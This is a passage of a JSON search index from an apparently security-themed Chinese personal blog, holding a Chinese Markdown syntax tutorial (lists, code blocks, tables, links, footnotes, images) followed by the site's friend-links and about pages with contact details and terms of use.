\u003cli\u003ePurus sodales ultricies\u003c/li\u003e \u003cli\u003eVestibulum laoreet porttitor sem\u003c/li\u003e \u003cli\u003eAc tristique libero volutpat at\u003c/li\u003e \u003c/ul\u003e \u003c/li\u003e \u003cli\u003eFaucibus porta lacus fringilla vel\u003c/li\u003e \u003cli\u003eAenean sit amet erat nunc\u003c/li\u003e \u003cli\u003eEget porttitor lorem\u003c/li\u003e \u003c/ul\u003e ","date":"2015-09-01","objectID":"/20150901/:8:1","tags":["语法"],"title":"Markdown 基本语法","uri":"/20150901/"},{"categories":["教程"],"content":"有序列表 一系列项的列表, 其中项的顺序确实很重要. 1. Lorem ipsum dolor sit amet 2. Consectetur adipiscing elit 3. Integer molestie lorem at massa 4. Facilisis in pretium nisl aliquet 5. Nulla volutpat aliquam velit 6. Faucibus porta lacus fringilla vel 7. Aenean sit amet erat nunc 8. Eget porttitor lorem 呈现的输出效果如下: Lorem ipsum dolor sit amet Consectetur adipiscing elit Integer molestie lorem at massa Facilisis in pretium nisl aliquet Nulla volutpat aliquam velit Faucibus porta lacus fringilla vel Aenean sit amet erat nunc Eget porttitor lorem 输出的 HTML 看起来像这样: \u003col\u003e \u003cli\u003eLorem ipsum dolor sit amet\u003c/li\u003e \u003cli\u003eConsectetur adipiscing elit\u003c/li\u003e \u003cli\u003eInteger molestie lorem at massa\u003c/li\u003e \u003cli\u003eFacilisis in pretium nisl aliquet\u003c/li\u003e \u003cli\u003eNulla volutpat aliquam velit\u003c/li\u003e \u003cli\u003eFaucibus porta lacus fringilla vel\u003c/li\u003e \u003cli\u003eAenean sit amet erat nunc\u003c/li\u003e \u003cli\u003eEget porttitor lorem\u003c/li\u003e \u003c/ol\u003e 技巧 如果你对每一项使用 1., Markdown 将自动为每一项编号. 例如: 1. Lorem ipsum dolor sit amet 1. Consectetur adipiscing elit 1. Integer molestie lorem at massa 1. Facilisis in pretium nisl aliquet 1. Nulla volutpat aliquam velit 1. Faucibus porta lacus fringilla vel 1. Aenean sit amet erat nunc 1. Eget porttitor lorem 呈现的输出效果如下: Lorem ipsum dolor sit amet Consectetur adipiscing elit Integer molestie lorem at massa Facilisis in pretium nisl aliquet Nulla volutpat aliquam velit Faucibus porta lacus fringilla vel Aenean sit amet erat nunc Eget porttitor lorem ","date":"2015-09-01","objectID":"/20150901/:8:2","tags":["语法"],"title":"Markdown 基本语法","uri":"/20150901/"},{"categories":["教程"],"content":"任务列表 任务列表使你可以创建带有复选框的列表. 要创建任务列表, 请在任务列表项之前添加破折号 (-) 和带有空格的方括号 ([ ]). 要选择一个复选框，请在方括号之间添加 x ([x]). - [x] Write the press release - [ ] Update the website - [ ] Contact the media 呈现的输出效果如下: Write the press release Update the website Contact the media ","date":"2015-09-01","objectID":"/20150901/:8:3","tags":["语法"],"title":"Markdown 基本语法","uri":"/20150901/"},{"categories":["教程"],"content":"9 代码 ","date":"2015-09-01","objectID":"/20150901/:9:0","tags":["语法"],"title":"Markdown 基本语法","uri":"/20150901/"},{"categories":["教程"],"content":"行内代码 用 ` 包装行内代码段. 在这个例子中, `\u003csection\u003e\u003c/section\u003e` 会被包裹成 **代码**. 呈现的输出效果如下: 在这个例子中, \u003csection\u003e\u003c/section\u003e 会被包裹成 代码. 输出的 HTML 看起来像这样: \u003cp\u003e 在这个例子中, \u003ccode\u003e\u0026lt;section\u0026gt;\u0026lt;/section\u0026gt;\u003c/code\u003e 会被包裹成 \u003cstrong\u003e代码\u003c/strong\u003e. \u003c/p\u003e ","date":"2015-09-01","objectID":"/20150901/:9:1","tags":["语法"],"title":"Markdown 基本语法","uri":"/20150901/"},{"categories":["教程"],"content":"缩进代码 将几行代码缩进至少四个空格，例如: // Some comments line 1 of code line 2 of code line 3 of code 呈现的输出效果如下: // Some comments line 1 of code line 2 of code line 3 of code 输出的 HTML 看起来像这样: \u003cpre\u003e \u003ccode\u003e // Some comments line 1 of code line 2 of code line 3 of code \u003c/code\u003e \u003c/pre\u003e ","date":"2015-09-01","objectID":"/20150901/:9:2","tags":["语法"],"title":"Markdown 基本语法","uri":"/20150901/"},{"categories":["教程"],"content":"围栏代码块 使用 “围栏” ``` 来生成一段带有语言属性的代码块. ```markdown Sample text here... ``` 输出的 HTML 看起来像这样: \u003cpre language-html\u003e \u003ccode\u003eSample text here...\u003c/code\u003e \u003c/pre\u003e ","date":"2015-09-01","objectID":"/20150901/:9:3","tags":["语法"],"title":"Markdown 基本语法","uri":"/20150901/"},{"categories":["教程"],"content":"语法高亮 GFMGitHub Flavored Markdown 也支持语法高亮. 要激活它，只需在第一个代码 “围栏” 之后直接添加你要使用的语言的文件扩展名, ```js, 语法高亮显示将自动应用于渲染的 HTML 中. 例如, 在以下 JavaScript 代码中应用语法高亮: ```js grunt.initConfig({ assemble: { options: { assets: 'docs/assets', data: 'src/data/*.{json,yml}', helpers: 'src/custom-helpers.js', partials: ['src/partials/**/*.{hbs,md}'] }, pages: { options: { layout: 'default.hbs' }, files: { './': ['src/templates/pages/index.hbs'] } } } }; ``` 呈现的输出效果如下: grunt.initConfig({ assemble: { options: { assets: 'docs/assets', data: 'src/data/*.{json,yml}', helpers: 'src/custom-helpers.js', partials: ['src/partials/**/*.{hbs,md}'] }, pages: { options: { layout: 'default.hbs' }, files: { './': ['src/templates/pages/index.hbs'] } } } }; 注意 Hugo 文档中的 语法高亮页面 介绍了有关语法高亮的更多信息, 包括语法高亮的 shortcode. ","date":"2015-09-01","objectID":"/20150901/:9:4","tags":["语法"],"title":"Markdown 基本语法","uri":"/20150901/"},{"categories":["教程"],"content":"10 表格 通过在每个单元格之间添加竖线作为分隔线, 并在标题下添加一行破折号 (也由竖线分隔) 来创建表格. 注意, 竖线不需要垂直对齐. | Option | Description | | ------ | ----------- | | data | path to data files to supply the data that will be passed into templates. | | engine | engine to be used for processing templates. Handlebars is the default. | | ext | extension to be used for dest files. | 呈现的输出效果如下: Option Description data path to data files to supply the data that will be passed into templates. engine engine to be used for processing templates. Handlebars is the default. ext extension to be used for dest files. 输出的 HTML 看起来像这样: \u003ctable\u003e \u003cthead\u003e \u003ctr\u003e \u003cth\u003eOption\u003c/th\u003e \u003cth\u003eDescription\u003c/th\u003e \u003c/tr\u003e \u003c/thead\u003e \u003ctbody\u003e \u003ctr\u003e \u003ctd\u003edata\u003c/td\u003e \u003ctd\u003epath to data files to supply the data that will be passed into templates.\u003c/td\u003e \u003c/tr\u003e \u003ctr\u003e \u003ctd\u003eengine\u003c/td\u003e \u003ctd\u003eengine to be used for processing templates. Handlebars is the default.\u003c/td\u003e \u003c/tr\u003e \u003ctr\u003e \u003ctd\u003eext\u003c/td\u003e \u003ctd\u003eextension to be used for dest files.\u003c/td\u003e \u003c/tr\u003e \u003c/tbody\u003e \u003c/table\u003e 文本右对齐或居中对齐 在任何标题下方的破折号右侧添加冒号将使该列的文本右对齐. 在任何标题下方的破折号两边添加冒号将使该列的对齐文本居中. | Option | Description | |:------:| -----------:| | data | path to data files to supply the data that will be passed into templates. | | engine | engine to be used for processing templates. Handlebars is the default. | | ext | extension to be used for dest files. | 呈现的输出效果如下: Option Description data path to data files to supply the data that will be passed into templates. engine engine to be used for processing templates. Handlebars is the default. ext extension to be used for dest files. ","date":"2015-09-01","objectID":"/20150901/:10:0","tags":["语法"],"title":"Markdown 基本语法","uri":"/20150901/"},{"categories":["教程"],"content":"11 链接 ","date":"2015-09-01","objectID":"/20150901/:11:0","tags":["语法"],"title":"Markdown 基本语法","uri":"/20150901/"},{"categories":["教程"],"content":"基本链接 \u003chttps://assemble.io\u003e \u003ccontact@revolunet.com\u003e [Assemble](https://assemble.io) 呈现的输出效果如下 (将鼠标悬停在链接上，没有提示): https://assemble.io contact@revolunet.com Assemble 输出的 HTML 看起来像这样: \u003ca href=\"https://assemble.io\"\u003ehttps://assemble.io\u003c/a\u003e \u003ca href=\"mailto:contact@revolunet.com\"\u003econtact@revolunet.com\u003c/a\u003e \u003ca href=\"https://assemble.io\"\u003eAssemble\u003c/a\u003e ","date":"2015-09-01","objectID":"/20150901/:11:1","tags":["语法"],"title":"Markdown 基本语法","uri":"/20150901/"},{"categories":["教程"],"content":"添加一个标题 [Upstage](https://github.com/upstage/ \"Visit Upstage!\") 呈现的输出效果如下 (将鼠标悬停在链接上，会有一行提示): Upstage 输出的 HTML 看起来像这样: \u003ca href=\"https://github.com/upstage/\" title=\"Visit Upstage!\"\u003eUpstage\u003c/a\u003e ","date":"2015-09-01","objectID":"/20150901/:11:2","tags":["语法"],"title":"Markdown 基本语法","uri":"/20150901/"},{"categories":["教程"],"content":"定位标记 定位标记使你可以跳至同一页面上的指定锚点. 例如, 每个章节: ## Table of Contents * [Chapter 1](#chapter-1) * [Chapter 2](#chapter-2) * [Chapter 3](#chapter-3) 将跳转到这些部分: ## Chapter 1 \u003ca id=\"chapter-1\"\u003e\u003c/a\u003e Content for chapter one. ## Chapter 2 \u003ca id=\"chapter-2\"\u003e\u003c/a\u003e Content for chapter one. ## Chapter 3 \u003ca id=\"chapter-3\"\u003e\u003c/a\u003e Content for chapter one. 注意 定位标记的位置几乎是任意的. 因为它们并不引人注目, 所以它们通常被放在同一行了. ","date":"2015-09-01","objectID":"/20150901/:11:3","tags":["语法"],"title":"Markdown 基本语法","uri":"/20150901/"},{"categories":["教程"],"content":"12 脚注 脚注使你可以添加注释和参考, 而不会使文档正文混乱. 当你创建脚注时, 会在添加脚注引用的位置出现带有链接的上标编号. 读者可以单击链接以跳至页面底部的脚注内容. 要创建脚注引用, 请在方括号中添加插入符号和标识符 ([^1]). 标识符可以是数字或单词, 但不能包含空格或制表符. 标识符仅将脚注引用与脚注本身相关联 - 在脚注输出中, 脚注按顺序编号. 在中括号内使用插入符号和数字以及用冒号和文本来添加脚注内容 ([^1]：这是一段脚注). 你不一定要在文档末尾添加脚注. 可以将它们放在除列表, 引用和表格等元素之外的任何位置. 这是一个数字脚注[^1]. 这是一个带标签的脚注[^label] [^1]: 这是一个数字脚注 [^label]: 这是一个带标签的脚注 这是一个数字脚注1. 这是一个带标签的脚注2 ","date":"2015-09-01","objectID":"/20150901/:12:0","tags":["语法"],"title":"Markdown 基本语法","uri":"/20150901/"},{"categories":["教程"],"content":"13 图片 图片的语法与链接相似, 但包含一个在前面的感叹号. ![Minion](https://octodex.github.com/images/minion.png) 或者: ![Alt text](https://octodex.github.com/images/stormtroopocat.jpg \"The Stormtroopocat\") The StormtroopocatAlt text \" The Stormtroopocat 像链接一样, 图片也具有脚注样式的语法: ![Alt text][id] The DojocatAlt text \" The Dojocat 稍后在文档中提供参考内容, 用来定义 URL 的位置: [id]: https://octodex.github.com/images/dojocat.jpg \"The Dojocat\" 这是一个数字脚注 ↩︎ 这是一个带标签的脚注 ↩︎ ","date":"2015-09-01","objectID":"/20150901/:13:0","tags":["语法"],"title":"Markdown 基本语法","uri":"/20150901/"},{"categories":null,"content":" bysec bysec个人博客 缥缈博客 缥缈个人博客 ","date":"2015-09-01","objectID":"/link/:0:0","tags":null,"title":"友链","uri":"/link/"},{"categories":null,"content":"关于网站 个人博客，欢迎交流。 QQ: 547968300 邮箱: CNbysec@foxmail.com ","date":"2015-09-01","objectID":"/about/:1:0","tags":null,"title":"关于","uri":"/about/"},{"categories":null,"content":"关于作者 💗 💻 技术宅，热爱关于计算机的一切 😱 强迫症与拖延症患者 🤔 热衷于了解世界的运转机制 ❤️ 爱好游戏、摄影 ","date":"2015-09-01","objectID":"/about/:2:0","tags":null,"title":"关于","uri":"/about/"},{"categories":null,"content":"关于版权 本站所有的原创文章均受 创作共享 署名-非商业性 4.0 许可协议 / CC BY-NC 4.0 保护。 ","date":"2015-09-01","objectID":"/about/:3:0","tags":null,"title":"关于","uri":"/about/"},{"categories":null,"content":"用户条款 警告 《中华人民共和国网络安全法》是为保障网络安全，维护网络空间主权和国家安全、社会公共利益，保护公民、法人和其他组织的合法权益，促进经济社会信息化健康发展而制定的法律。 警告 《中华人民共和国网络安全法》由中华人民共和国第十二届全国人民代表大会常务委员会第二十四次会议于2016年11月7日通过，自2017年6月1日起施行 禁止 本站提供的一切软件、教程和内容信息仅限用于学习和研究目的；不得将上述内容用于商业或者非法用途，否则，一切后果请用户自负。 ","date":"2015-09-01","objectID":"/about/:4:0","tags":null,"title":"关于","uri":"/about/"}]